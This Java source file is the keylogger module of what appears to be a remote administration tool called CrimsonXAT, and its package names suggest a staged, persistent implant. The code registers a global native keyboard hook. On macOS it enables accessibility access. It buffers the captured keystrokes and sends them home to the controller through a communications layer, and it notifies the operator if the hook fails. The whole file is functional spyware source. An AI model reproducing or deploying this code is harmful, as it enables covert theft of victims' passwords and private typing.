/*******************************************************************************
 *              Crimson Extended Administration Tool (CrimsonXAT)              *
 *                   Copyright (C) 2015 Subterranean Security                  *
 *                                                                             *
 *     This program is free software: you can redistribute it and/or modify    *
 *     it under the terms of the GNU General Public License as published by    *
 *      the Free Software Foundation, either version 3 of the License, or      *
 *                      (at your option) any later version.                    *
 *                                                                             *
 *       This program is distributed in the hope that it will be useful,       *
 *        but WITHOUT ANY WARRANTY; without even the implied warranty of       *
 *        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the        *
 *                 GNU General Public License for more details.                *
 *                                                                             *
 *      You should have received a copy of the GNU General Public License      *
 *      along with this program.  If not, see http://www.gnu.org/licenses      *
 *******************************************************************************/
package subterranean.crimson.permajar.stage2.modules.keylogger;



import java.util.Date;

import org.jnativehook.GlobalScreen;

import subterranean.crimson.permajar.stage1.network.Communications;
import subterranean.crimson.permajar.stage2.Commands;
import subterranean.crimson.permajar.stage2.Stage2;
import subterranean.crimson.universal.BMN;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.Platform;
import subterranean.crimson.universal.Reporter;
import subterranean.crimson.universal.Utilities;
import subterranean.crimson.universal.containers.Day;
import subterranean.crimson.universal.containers.Message;
import subterranean.crimson.universal.containers.SystemMessage;

public enum Keylogger {

	;
	public static boolean keylogging = false;
	public static int flushThreshold = 20;

	private static NKL nkl = new NKL();

	public static void flush() {
		if (Stage2.getSettings().newChars == 0) {
			return;// nothing to be refreshed
		}
		// flush keystrokes
		Day[] days = Stage2.getSettings().keyloggerLog.getLast(Stage2.getSettings().newChars);
		Message mres = new Message(Utilities.randId(), BMN.INCOMING_keyloggerData, days);
		Communications.sendHome(mres);
		Stage2.getSettings().newChars = 0;

	}

	public static void start() {
		if (keylogging) {
			return;
		}

		if (Platform.osx) {
			Utilities.enableAT();
		}

		//
		Logger.add("Starting keylogger");
		try {
			GlobalScreen.registerNativeHook();
			// initialze native hook.
			GlobalScreen.getInstance().addNativeKeyListener(nkl);
			keylogging = true;
		} catch (Throwable ex) {
			Reporter.report(ex);
			keylogging = false;

			// generate a system message for this
			SystemMessage sm = new SystemMessage();
			sm.source = "Client Keylogger Module";
			sm.date = new Date();
			sm.subject = "Keylogger failed to Start";
			sm.urgency = 3;
			sm.message = "The keylogger failed to initialize a keyboard hook. The following exception was generated: " + ex.toString() + ".  You can try to restart the module manually.";

			Commands.sendSM(sm);
		}

	}

	public static void stop() {
		if (!keylogging) {
			return;
		}
		Logger.add("Stopping keylogger");
		GlobalScreen.unregisterNativeHook();
		keylogging = false;

	}

}
